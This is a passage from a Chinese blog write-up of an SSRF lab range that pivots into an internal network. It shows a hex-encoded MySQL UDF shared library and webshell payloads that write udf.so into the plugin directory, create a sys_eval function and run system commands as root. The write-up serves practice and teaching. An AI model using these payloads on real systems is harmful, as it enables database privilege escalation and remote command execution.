3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000%2520INTO%2520DUMPFILE%2520\&quot;/usr/lib/mysql/plugin/udf.so\&quot;;&quot;%2520-v%2520-c%2520&gt;1.txt;ls%2520-lah;cat%25201.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div></details> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/31.png" alt="31"></p> <p>创建自定义RCE函数</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># payload</span>
<span class="token assign-left variable">url</span><span class="token operator">=</span>http://192.168.100.28/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'python%2520exp.py%2520-t%2520192.168.100.29%2520-u%2520root%2520-p%2520&quot;&quot;%2520-d%2520&quot;&quot;%2520-P%2520&quot;CREATE%2520FUNCTION%2520sys_eval%2520RETURNS%2520STRING%2520SONAME%2520\&quot;udf.so\&quot;;&quot;%2520-v%2520-c%2520&gt;1.txt;ls%2520-lah;cat%25201.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>执行命令</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># payload</span>
<span class="token assign-left variable">url</span><span class="token operator">=</span>http://192.168.100.28/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'python%2520exp.py%2520-t%2520192.168.100.29%2520-u%2520root%2520-p%2520&quot;&quot;%2520-d%2520&quot;&quot;%2520-P%2520&quot;select%2520sys_eval(\&quot;whoami;ls%2520/\&quot;)&quot;%2520-v%2520-c%2520&gt;1.txt;ls%2520-lah;cat%25201.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/32.png" alt="32"></p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/33.png" alt="33"></p> <p>参考：</p> <ul><li><a href="https://www.sqlsec.com/2021/05/ssrf.html" target="_blank" rel="noopener noreferrer">手把手带你用 SSRF 打穿内网 <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://baozongwi.xyz/2025/04/02/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BAssrf%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/" target="_blank" rel="noopener noreferrer">国光靶场ssrf打穿内网<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://blog.csdn.net/qq_29948489/article/details/135876381" target="_blank" rel="noopener noreferrer">Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://blog.csdn.net/m0_46317063/article/details/128816033" target="_blank" rel="noopener noreferrer">java安全——jsp一句话木马<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://www.freebuf.com/articles/web/337824.html" target="_blank" rel="noopener noreferrer">gopher协议的利用<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://github.com/FoolMitAh/mysql_gopher_attack/tree/master" target="_blank" rel="noopener noreferrer">帮助生成gopher攻击mysql的payload<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://blog.csdn.net/crisprx/article/details/104251284" target="_blank" rel="noopener noreferrer">SSRF利用 Gopher |Gopher攻击mysql及内网<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://www.sqlsec.com/tools/udf.html" target="_blank" rel="noopener noreferrer">MySQL UDF 提权十六进制查询 | 国光<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://github.com/SEC-GO/Red-vs-Blue/blob/master/linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84MySQL%20UDF%E6%8F%90%E6%9D%83.md" target="_blank" rel="noopener noreferrer">linux环境下的MySQL UDF提权<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div>  <div class="page-edit"><div class="edit-link"><a href="https://github.com/Apursuit/Apursuit.github.io/edit/master/docs/01.wp/22.国光靶场ssrf打穿内网.md" target="_blank" rel="noopener noreferrer">编辑</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <!----> <div class="last-updated"><span class="prefix">最后一次更新于:</span> <span class="time">2025/10/08, 22:34:57</span></div></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/02e0b4/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">应急响应-apahce日志分析</div></a> <a href="/pages/actf2025/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">ACTF2025 web部分题解</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/pages/02e0b4/" class="prev">应急响应-apahce日志分析</a></span> <span class="next"><a href="/pages/actf2025/">ACTF2025 web部分题解</a>→
      </span></p></div></div></div> <!----></main></div> <div class="footer"><div class="icons"><a href="mailto:admin@gmail.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/Apursuit" title="GitHub" target="_blank" class="iconfont icon-github"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2024-2025
    <span></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <!----> <!----> <!----></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.285d429f.js" defer></script><script src="/assets/js/2.a5a506a3.js" defer></script><script src="/assets/js/27.32b48f50.js" defer></script>
  </body>
</html>
